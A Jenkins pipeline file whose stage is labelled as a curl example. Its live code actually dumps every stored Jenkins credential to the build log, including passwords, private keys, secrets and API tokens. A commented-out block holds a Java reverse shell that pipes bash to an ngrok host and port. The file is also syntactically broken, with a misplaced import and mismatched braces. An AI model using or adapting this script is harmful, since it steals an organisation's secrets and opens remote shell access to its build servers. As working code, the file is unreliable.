pipeline { 
    agent any
    stages {
        stage("Using curl example") {
            steps {
import java.nio.charset.StandardCharsets;
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
      com.cloudbees.plugins.credentials.Credentials.class
)
for (c in creds) {
  println(c.id)
  if (c.properties.description) {
    println("   description: " + c.description)
  }
  if (c.properties.username) {
    println("   username: " + c.username)
  }
  if (c.properties.password) {
    println("   password: " + c.password)
  }
  if (c.properties.passphrase) {
    println("   passphrase: " + c.passphrase)
  }
  if (c.properties.secret) {
    println("   secret: " + c.secret)
  }
  if (c.properties.secretBytes) {
    println("    secretBytes: ")
    println("")
    println(  new String(c.secretBytes.getPlainData(), StandardCharsets.UTF_8))
    println("")
  }
  if (c.properties.privateKeySource) {
    println("   privateKey: " + c.getPrivateKey())
  }
  if (c.properties.apiToken) {
    println("   apiToken: " + c.apiToken)
  }
  if (c.properties.token) {
    println("   token: " + c.token)
  }
  println("")
}
            }
                //script {
                    //ls -a
                    //whoami
                    //String host="0.tcp.eu.ngrok.io";
                    //int y = 10;
                    //int x = 20;
                    //int port=14723;
                    //String cmd="bash";
                    //Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
                    //}
                //}
            }
        }
    
}
